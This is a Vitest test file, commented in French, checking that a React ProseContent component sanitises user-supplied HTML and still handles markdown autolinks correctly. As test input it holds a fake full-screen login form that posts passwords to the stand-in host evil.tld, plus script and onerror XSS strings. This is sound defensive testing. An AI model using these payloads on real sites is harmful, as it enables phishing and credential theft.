// @vitest-environment jsdom
import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";
import { ProseContent } from "./ProseContent";

/**
 * `ProseContent` rend du texte saisi par N'IMPORTE QUEL utilisateur (description
 * d'un commun, réponse coform) via `dangerouslySetInnerHTML`. Les cas XSS
 * « classiques » (script, handler, javascript:) vivent dans
 * `modules/coform/components/FormFields.test.tsx` ; ici, ce que ces cas ne
 * voient pas.
 */
describe("ProseContent — profil de sanitisation restreint (H23)", () => {
  it("ne rend jamais un faux écran de connexion : ni form/input/button, ni style, ni class", () => {
    // Aucun script : le profil DOMPurify PAR DÉFAUT laissait passer ce payload
    // tel quel, et la route `/aac/commun/:answerId` est publique.
    const { container } = render(
      <ProseContent
        text={
          '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:99999" class="fixed inset-0">' +
          '<form action="https://evil.tld/steal"><input type="password" name="pwd"><button>Se connecter</button></form></div>'
        }
      />,
    );
    expect(container.querySelector("form")).toBeNull();
    expect(container.querySelector("input")).toBeNull();
    expect(container.querySelector("button")).toBeNull();
    expect(container.querySelector("[style]")).toBeNull();
    expect(container.querySelector("div div")?.getAttribute("class")).toBeNull();
    // Le texte, lui, reste lisible.
    expect(container.textContent).toContain("Se connecter");
  });

  it("applique le même profil à la branche markdown (HTML inline dans du markdown)", () => {
    const { container } = render(
      <ProseContent text={'**ok** <span style="position:fixed" class="fixed">x</span>'} forceMarkdown />,
    );
    expect(container.querySelector("strong")?.textContent).toBe("ok");
    const span = container.querySelector("span");
    expect(span).not.toBeNull();
    expect(span?.getAttribute("style")).toBeNull();
    expect(span?.getAttribute("class")).toBeNull();
  });

  it("le `className` de l'appelant reste le seul habillage", () => {
    const { container } = render(<ProseContent text={"Texte"} className="prose prose-sm" />);
    expect(container.firstElementChild?.className).toBe("prose prose-sm");
  });
});

/**
 * Le profil restreint suit la SOURCE du texte, pas le composant : `ProseContent`
 * rend aussi la définition d'un formulaire (`field.info`, titre/description de
 * section), écrite par l'administrateur de l'AAP. Lui appliquer le profil
 * restreint aplatissait la présentation de formulaires du parc.
 */
describe("ProseContent — `source` choisit le profil", () => {
  const MISE_EN_FORME =
    '<p class="lead" id="intro" style="color:#c00">Merci de <b>détailler</b>' +
    ' <svg viewBox="0 0 8 8"><circle cx="4" cy="4" r="3"/></svg></p>';

  it("`source=\"formDefinition\"` conserve style, class, id et le SVG d'un libellé admin", () => {
    const { container } = render(<ProseContent text={MISE_EN_FORME} source="formDefinition" />);
    const p = container.querySelector("p");
    expect(p?.getAttribute("style")).toContain("color");
    expect(p?.getAttribute("class")).toBe("lead");
    expect(p?.getAttribute("id")).toBe("intro");
    expect(container.querySelector("svg")).not.toBeNull();
    expect(container.querySelector("b")?.textContent).toBe("détailler");
  });

  it("le même texte rendu sans `source` (défaut utilisateur) perd ces crochets", () => {
    const { container } = render(<ProseContent text={MISE_EN_FORME} />);
    const p = container.querySelector("p");
    expect(p?.getAttribute("style")).toBeNull();
    expect(p?.getAttribute("class")).toBeNull();
    expect(p?.getAttribute("id")).toBeNull();
    expect(container.querySelector("svg")).toBeNull();
  });

  it("`source=\"formDefinition\"` retire quand même scripts et handlers", () => {
    // Le profil par défaut n'est pas « pas de sanitisation ».
    const { container } = render(
      <ProseContent
        text={'<p>ok</p><script>window.__pwned = 1;</script><img src="x" onerror="window.__pwned = 1">'}
        source="formDefinition"
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")?.getAttribute("onerror")).toBeNull();
  });

  it("une réponse d'utilisateur reste assainie même à côté d'un formulaire mis en forme", () => {
    // `source` est une décision par appel : le profil admin ne déteint pas.
    const reponse =
      '<div style="position:fixed;inset:0" class="fixed inset-0">' +
      '<form action="https://evil.tld"><input type="password"></form></div>';
    const { container } = render(<ProseContent text={reponse} source="userInput" />);
    expect(container.querySelector("form")).toBeNull();
    expect(container.querySelector("input")).toBeNull();
    expect(container.querySelector("[style]")).toBeNull();
    expect(container.querySelector("[class]")).toBeNull();
  });
});

/**
 * L'auto-détection HTML ne doit reconnaître qu'une VRAIE balise. Un rédacteur
 * qui tape un autolien markdown (`<https://…>`, `<contact@…>`) dans le textarea
 * d'un commun doit voir son lien ET son markdown, pas un texte brut amputé.
 */
describe("ProseContent — auto-détection HTML vs markdown (M46)", () => {
  const DESCRIPTION = "Notre site : <https://commun.fr>\n\n## Objectifs\n\n- a\n- b";

  it("un autolien markdown ne fait pas basculer le texte en HTML brut", () => {
    const { container } = render(<ProseContent text={DESCRIPTION} />);
    // L'URL est rendue en lien (et n'a pas disparu)…
    expect(container.querySelector('a[href="https://commun.fr"]')?.textContent).toBe("https://commun.fr");
    // …et le reste du markdown est interprété.
    expect(container.querySelector("h2")?.textContent).toBe("Objectifs");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.textContent).not.toContain("##");
  });

  it("un e-mail entre chevrons devient un lien mailto:", () => {
    const { container } = render(<ProseContent text={"Écrire à <contact@commun.fr> **vite**"} />);
    expect(container.querySelector('a[href="mailto:contact@commun.fr"]')).not.toBeNull();
    expect(container.querySelector("strong")?.textContent).toBe("vite");
  });

  it("une comparaison `a < b` reste du texte", () => {
    const { container } = render(<ProseContent text={"si a < b et c > d, **ok**"} />);
    expect(container.textContent).toContain("a < b et c > d");
    expect(container.querySelector("strong")?.textContent).toBe("ok");
  });

  it("du HTML déjà rendu (Parsedown) reste pris tel quel, sans ré-interprétation markdown", () => {
    // Une ligne indentée de 4 espaces serait un bloc de code en markdown.
    const { container } = render(<ProseContent text={'<p class="x">Bonjour</p>\n    <p>suite</p>'} />);
    expect(container.querySelector("pre")).toBeNull();
    expect(container.querySelectorAll("p")).toHaveLength(2);
  });

  it("reconnaît une balise fermante seule et une balise avec attributs", () => {
    const { container: a } = render(<ProseContent text={"fin</p>\n    code?"} />);
    expect(a.querySelector("pre")).toBeNull();
    const { container: b } = render(<ProseContent text={'<a href="https://x.org" rel="noopener">l</a>\n    code?'} />);
    expect(b.querySelector("pre")).toBeNull();
  });
});
